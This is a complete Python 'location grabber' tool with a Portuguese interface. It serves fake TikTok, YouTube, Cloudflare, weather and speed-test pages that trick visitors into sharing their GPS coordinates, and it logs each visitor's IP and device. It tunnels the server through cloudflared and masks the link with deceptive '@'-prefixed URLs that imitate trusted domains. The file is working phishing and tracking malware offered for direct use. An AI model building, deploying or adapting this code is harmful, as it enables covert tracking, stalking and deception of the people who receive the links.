import os, sys, json, base64, time, subprocess, threading, re, random
from flask import Flask, render_template_string, request

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.align import Align
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.align import Align

console = Console()

LOG_FILE = "logs_graber_x.txt"
MY_TIKTOK = "https://www.tiktok.com/@archmodel57.wha?_r=1&_t=ZS-94uzsz9ny6x"
GITHUB_LINK = "https://github.com/Anonymous40443"
ACCESS_KEY = base64.b64decode("cHJveHk=").decode('utf-8')

LOCKED_ART = r"""
 [!] STATUS: SYSTEM_CRITICAL_LOCK
 [+] -------------------------------------- [+]
 [!]           IDENTIFICATION KEY             [!]
 [+] -------------------------------------- [+]
          
            .---.    [ WARNING ]
           /     \   UNAUTHORIZED ACCESS
           | (X) |   WILL BE LOGGED
           |  _  |   
      ____|_|_|_|____
     [_______________]
     |      [ ]      |
     |_______________|

 [+] -------------------------------------- [+]
 [?] PROVIDE TOKEN TO BYPASS ENCRYPTION...
"""

UNLOCKED_ART = r"""
 [+] SYSTEM BYPASS SUCCESSFUL...
 [+] WELCOME BACK, ELLIOT.

       __      __      [+] ------------------ [+]
      /  \    /  \     [!]  STORM-EYE ACTIVE  [!]
     /    \__/    \    [+] ------------------ [+]
    /  /\      /\  \   [!]  VIGILANTE MODE    [!]
   /  /  \____/  \  \  [+] ------------------ [+]
   \  \  /    \  /  /
    \  \/      \/  /
     \____/--\____/
"""

HAWK_MAIN = r"""
               ___
            MANAGEMENT
          /     ^     \
     ____/      |      \____
    /    \     / \     /    \
   /______\   /   \   /______\
           \/     \/
"""

TIGER_EXIT = [
r"""
     [bold magenta]       _,,..-''-..,,_ [/bold magenta]
     [bold magenta]    _,'               '._ [/bold magenta]
     [bold magenta]  ,'    _,,..-''-..,,_   '. [/bold magenta]
     [bold magenta] /   ,'                '.   \ [/bold magenta]
""",
r"""
     [bold red]  /   /  _       _   \   \ [/bold red]
     [bold red] |   |  (@)     (@)  |   | [/bold red]
     [bold red] |   |      ____     |   | [/bold red]
     [bold red]  \   \    \__/    /   / [/bold red]
""",
r"""
     [bold white]   \   '.        .'   / [/bold white]
     [bold white]    '.   '-....-'   .' [/bold white]
     [bold white]      '-._      _.-' [/bold white]
     [bold yellow]           `----` [/bold yellow]
"""
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def exit_animation():
    clear()
    for frame in TIGER_EXIT:
        console.print(Align.center(frame))
        time.sleep(0.3)
    console.print(Align.center("[bold red]SCRATCHING SYSTEM... TERMINATED.[/bold red]"))
    sys.exit()

def purple_spinner(text="INITIALIZING"):
    with Progress(SpinnerColumn(spinner_name="dots", style="bold purple"), TextColumn("[bold purple]{task.description}..."), BarColumn(bar_width=None, pulse_style="bold purple"), console=console) as progress:
        task = progress.add_task(text, total=None)
        time.sleep(3)

def loading(text="PROCESSING"):
    with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), BarColumn(bar_width=30, complete_style="red"), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
        task = progress.add_task(text, total=100)
        while not progress.finished:
            progress.update(task, advance=random.uniform(3, 9))
            time.sleep(0.03)

def check_access():
    clear()
    console.print(Align.center(f"[bold red]{LOCKED_ART}[/bold red]"))
    console.print("\n[bold red][?] TOKEN REQUIRED[/bold red]")
    pwd = input(" >> ").strip()
    if pwd == ACCESS_KEY:
        purple_spinner("BYPASSING ENCRYPTION")
        clear()
        console.print(Align.center(f"[bold green]{UNLOCKED_ART}[/bold green]"))
        time.sleep(1.5)
        return True
    else:
        console.print("[bold red][!] ACCESS DENIED.[/bold red]")
        sys.exit()

def get_masked_url(url, isca_type):
    try:
        import requests
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=10)
        if res.status_code == 200:
            short = res.text.strip().replace("https://", "")
            masks = {
                '6': "https://tiktok.com.br.trending.vids-share@",
                '7': "https://youtube.com.br.video-analytics@",
                'default': "https://google.com.url.sa-t.redirect@"
            }
            prefix = masks.get(isca_type, masks['default'])
            return f"{prefix}{short}"
        return url
    except:
        return url

app = Flask(__name__)

# HTML ATUALIZADO COM DESIGN OFICIAL TIKTOK E YOUTUBE
HTML_TPL = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title>
<style>
body { background: {{ bg }}; color: {{ color }}; font-family: 'Sofia Pro', sans-serif, Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;}
.box { border: {{ border }}; padding: 35px 25px; background: {{ box_bg }}; border-radius: {{ radius }}; max-width: 360px; width: 92%; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
button { background: {{ btn_bg }}; color: {{ btn_color }}; border: none; padding: 14px; font-weight: 700; cursor: pointer; margin-top: 25px; width: 100%; border-radius: {{ btn_radius }}; font-size: 16px; transition: 0.3s; }
.logo-img { width: 130px; margin-bottom: 20px; }
h2 { margin: 10px 0; font-size: 22px; font-weight: 800; }
p { font-size: 15px; line-height: 1.5; opacity: 0.9; margin: 15px 0; }
</style></head><body><div class="box">
<img src="{{ logo_url }}" class="logo-img" alt="Logo">
<h2>{{ header }}</h2><p>{{ msg }}</p>
<button onclick="loc()">{{ btn }}</button></div>
<script>
function loc() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition((p) => { 
fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'}, 
body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}) }).then(() => { window.location.href = "{{ dest }}"; }); 
}, (e) => { alert("Ação necessária: Permita o acesso à localização para continuar."); }, {enableHighAccuracy: true}); } else { alert("Navegador incompatível."); } }
</script></body></html>
"""

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    ua = d.get('ua', 'Unknown')
    device = ua.split("(")[1].split(")")[0] if "(" in ua else "Unknown"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    lat, lon = d.get('lat'), d.get('lon')
    maps = f"https://www.google.com/maps?q={lat},{lon}"
    console.print(Panel(f"[bold red]🎯 ALVO CAPTURADO![/bold red]\n[white]📱 DISPOSITIVO: {device}\n🌐 IP: {ip}\n📍 GPS: {lat}, {lon}\n🗺️ MAPS: {maps}[/white]", border_style="bold red", title="ALERTA"))
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.ctime()} | Device: {device} | IP: {ip} | GPS: {lat},{lon}\n")
    return "OK"

@app.route('/')
def index():
    t = request.args.get('t', '4')
    dest = request.args.get('to') or MY_TIKTOK
    iscas = {
        '1': {"bg": "#000", "color": "#0f0", "box_bg": "#050505", "border": "1px solid #0f0", "btn_bg": "#0f0", "btn_color": "#000", "logo_url": "https://cdn-icons-png.flaticon.com/512/1163/1163763.png", "title": "Clima", "header": "Clima Local", "msg": "Permita o GPS para receber a previsão exata da sua região.", "btn": "VER AGORA", "radius": "12px", "btn_radius": "4px"},
        '2': {"bg": "#000", "color": "#0f0", "box_bg": "#050505", "border": "1px solid #0f0", "btn_bg": "#0f0", "btn_color": "#000", "logo_url": "https://cdn-icons-png.flaticon.com/512/684/684831.png", "title": "SpeedTest", "header": "Teste de Velocidade", "msg": "Medindo latência e download da sua rede local...", "btn": "TESTAR AGORA", "radius": "12px", "btn_radius": "4px"},
        '3': {"bg": "#000", "color": "#0f0", "box_bg": "#050505", "border": "1px solid #0f0", "btn_bg": "#0f0", "btn_color": "#000", "logo_url": "https://cdn-icons-png.flaticon.com/512/1067/1067562.png", "title": "Cloudflare", "header": "Verificação DDoS", "msg": "Confirme que você é humano para acessar este site.", "btn": "ESTOU CIENTE", "radius": "12px", "btn_radius": "4px"},
        '4': {"bg": "#fff", "color": "#000", "box_bg": "#fff", "border": "1px solid #eee", "btn_bg": "#007bff", "btn_color": "#fff", "logo_url": "https://cdn-icons-png.flaticon.com/512/1011/1011407.png", "title": "Redirect", "header": "Redirecionando...", "msg": "Verifique sua localização para prosseguir com segurança.", "btn": "CONTINUAR", "radius": "8px", "btn_radius": "4px"},
        '6': {"bg": "#010101", "color": "#fff", "box_bg": "#010101", "border": "none", "btn_bg": "#fe2c55", "btn_color": "#fff", "logo_url": "https://lunavega.net/wp-content/uploads/2019/02/TikTok-Logo.png", "title": "TikTok", "header": "TikTok Trends", "msg": "Este vídeo requer acesso à localização para verificar a disponibilidade no Brasil.", "btn": "ASSISTIR NO TIKTOK", "radius": "0px", "btn_radius": "2px"},
        '7': {"bg": "#f9f9f9", "color": "#030303", "box_bg": "#fff", "border": "1px solid #e0e0e0", "btn_bg": "#cc0000", "btn_color": "#fff", "logo_url": "https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg", "title": "YouTube", "header": "Confirmar Região", "msg": "O criador restringiu este conteúdo. Confirme sua posição global para liberar o player.", "btn": "CONFIRMAR", "radius": "2px", "btn_radius": "2px"}
    }
    return render_template_string(HTML_TPL, **iscas.get(t, iscas['4']), dest=dest)

def monitor(isca, dest, use_mask):
    console.print("\n[bold yellow][+] DEPLOYING STEALTH TUNNEL...[/bold yellow]")
    time.sleep(3) 
    while True:
        if os.path.exists("cf.log"):
            with open("cf.log", "r") as f:
                log = f.read()
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", log)
            if match:
                raw_url = f"{match.group(0)}/?t={isca}&to={dest}"
                final_url = get_masked_url(raw_url, isca) if use_mask else raw_url
                console.print("\n[bold white]============================================================[/bold white]")
                console.print(f"[bold green][+] URL FURTIVA:[/bold green] [bold white]{final_url}[/bold white]")
                console.print("[bold white]============================================================[/bold white]")
                console.print("\n[bold blink red][!] AGUARDANDO CONEXÕES...[/bold blink red]")
                break
        time.sleep(1)

def menu():
    while True:
        clear()
        console.print(Align.center("[bold red] [+] G R A B E R - X  v12.7 [+] [/bold red]"))
        console.print(Align.center(f"[bold red]{HAWK_MAIN}[/bold red]"))
        console.print(Align.center("[bold red] [+] ----------------------- [+] [/bold red]"))
        console.print(Align.center(f"\n[bold blue]Created by Anonymous40443: {GITHUB_LINK}[/bold blue]\n"))
        
        m_table = Table(box=os.sys.modules['rich.table'].box.HEAVY, border_style="red", expand=True, show_header=False)
        m_table.add_column("ID", justify="center", style="bold cyan")
        m_table.add_column("CMD", style="white")
        m_table.add_row("01", "GERAR LINK FURTIVO")
        m_table.add_row("02", "INICIAR CLOUDFLARE")
        m_table.add_row("03", "VER BANCO DE DADOS")
        m_table.add_row("04", "ENCERRAR SESSÃO")
        console.print(m_table)
        
        console.print("\n[bold red]ESCOLHA[/bold red]")
        cmd = input(" >> ").strip()

        if cmd in ["1", "01"]:
            target = input("\n[?] REDIRECIONAR PARA: ") or MY_TIKTOK
            use_mask = input("\n[?] ATIVAR MASCARAMENTO AVANÇADO? (y/n): ").lower() == 'y'
            
            i_menu = Table(title="MODELOS DE ENGENHARIA", border_style="yellow")
            i_menu.add_column("ID", style="bold"); i_menu.add_column("Model")
            i_menu.add_row("1", "Clima"); i_menu.add_row("2", "Speed Test"); i_menu.add_row("3", "Anti-DDoS")
            i_menu.add_row("4", "Redirect"); i_menu.add_row("6", "TikTok (Design Oficial)"); i_menu.add_row("7", "YouTube (Design Oficial)")
            console.print(i_menu)
            isca = input("\n[?] SELECIONE O MODELO: ").strip() or "4"

            import logging
            logging.getLogger('werkzeug').setLevel(logging.ERROR)
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
            
            if os.path.exists("cf.log"): os.remove("cf.log")
            with open("cf.log", "w") as f:
                subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=f, stderr=f)
            monitor(isca, target, use_mask)
            input("\n[PRESS ENTER TO RETURN]")
        
        elif cmd in ["2", "02"]:
            os.system("pkg update -y && pkg install cloudflared -y" if os.path.exists("/data/data/com.termux") else "sudo apt install cloudflared -y")
            console.print("[green][+] Pronto![/green]")
        
        elif cmd in ["3", "03"]:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f: console.print(Panel(f.read(), title="BANCO DE DADOS"))
            input("\n[ENTER]")

        elif cmd in ["4", "04"]:
            exit_animation()

if __name__ == '__main__':
    if check_access():
        menu()
